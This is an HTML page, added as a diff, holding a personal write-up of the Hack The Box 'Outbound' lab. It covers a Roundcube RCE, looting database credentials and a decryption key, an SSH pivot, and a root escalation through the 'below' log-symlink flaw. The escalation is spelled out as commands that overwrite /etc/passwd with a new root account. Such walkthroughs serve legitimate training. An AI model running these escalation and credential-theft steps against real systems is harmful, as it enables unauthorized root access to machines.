@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>HTB Outbound | SuyogWrites</title>
+  <link rel="stylesheet" href="../css/style.css" />
+  <style>
+    body {
+      background: #111;
+      color: #eee;
+      font-family: 'Fira Code', monospace;
+    }
+
+    main {
+      max-width: 700px;
+      margin: 0 auto;
+      padding-bottom: 50px;
+    }
+
+    header {
+      text-align: center;
+      max-width: 700px;
+      margin: 0 auto;
+    }
+
+    img {
+      max-width: 100%;
+      margin: 10px 0;
+      border: 1px solid #444;
+      border-radius: 4px;
+    }
+
+    pre {
+      background: #222;
+      padding: 10px;
+      border-radius: 4px;
+      overflow-x: auto;
+    }
+
+    h2 {
+      margin-top: 30px;
+      color: #79b8ff;
+    }
+
+    p, ul {
+      line-height: 1.6;
+    }
+
+    .meta .tag {
+      display: inline-block;
+      background-color: #333;
+      color: #eee;
+      padding: 4px 8px;
+      margin: 3px 4px;
+      border-radius: 4px;
+      font-size: 0.85em;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <img src="../assets/images/outbound-icon.png" alt="Outbound Box Icon" style="width: 700px; margin-bottom: 50px;" />
+    <h1>Hack The Box: Outbound</h1>
+    <p><strong>OS:</strong> Windows • <strong>Difficulty:</strong> Medium</p>
+    <div class="meta">
+      <span class="tag">RCE</span>
+      <span class="tag">LDAP</span>
+      <span class="tag">Database Looting</span>
+      <span class="tag">Local PrivEsc</span>
+    </div>
+    <hr />
+  </header>
+
+  <main>
+    <h2>Recon</h2>
+    <p>Initial Nmap scan revealed two open ports:</p>
+    <ul>
+      <li>22/tcp – OpenSSH 9.6p1</li>
+      <li>80/tcp – Nginx 1.24.0</li>
+    </ul>
+    <p>Visiting <code>http://&lt;target_ip&gt;</code> redirected to <code>http://mail.outbound.htb/</code>. Added to <code>/etc/hosts</code>:</p>
+    <pre>&lt;target_ip&gt;  mail.outbound.htb</pre>
+
+    <h2>Web Enumeration</h2>
+    <p>Discovered Roundcube login portal. Ran Nuclei:</p>
+    <pre>nuclei -u http://mail.outbound.htb/</pre>
+    <p>Found <strong>CVE-2025–49113</strong> (RCE via insecure deserialization). Also:</p>
+    <ul>
+      <li><code>/roundcube/logs/errors.log</code> exposed</li>
+    </ul>
+
+    <h2>Exploitation</h2>
+    <p>Used PoC exploit for RCE and gained reverse shell as <code>www-data</code>. Found user <code>tyler</code> in <code>/home</code>:</p>
+    <pre>su tyler</pre>
+
+    <h2>Database Looting</h2>
+    <p>Found creds in:</p>
+    <pre>/var/www/html/roundcube/config/config.inc.php</pre>
+    <p>Logged into MySQL:</p>
+    <pre>mysql -u roundcube -pRCDBPass2025 -h localhost roundcube</pre>
+    <p>Decrypted session with Triple DES using:</p>
+    <pre>rcmail-!24ByteDESkey*Str</pre>
+    <p>Recovered password for <code>jacob</code>.</p>
+
+    <h2>SSH Access</h2>
+    <pre>ssh jacob@outbound.htb</pre>
+
+    <h2>Privilege Escalation</h2>
+    <pre>sudo -l</pre>
+    <p>Revealed access to <code>/usr/bin/below</code>, exploitable via <strong>CVE-2025–27591</strong>. Root escalation:</p>
+    <pre>
+echo 'root2:aacFCuAIHhrCM:0:0:,,,:/root:/bin/bash' > root2
+rm error_root.log
+ln -s /etc/passwd error_root.log
+sudo /usr/bin/below
+cp root2 error_root.log
+su root2
+    </pre>
+    <p>Password hash via:</p>
+    <pre>perl -e 'print crypt("1","aa")'</pre>
+
+    <h2>Root Access</h2>
+    <p>Shell upgraded. Switched to root2 successfully:</p>
+    <img src="../assets/images/root-access.png" alt="Gaining Root Access Screenshot" />
+
+    <h2>Conclusion</h2>
+    <p>From RCE in Roundcube → decrypted DB creds → SSH pivot → log overwrite exploit for full root. Solid escalation path and rewarding finish.</p>
+
+    <p><a href="../index.html">← Back to homepage</a></p>
+  </main>
+</body>
+</html>
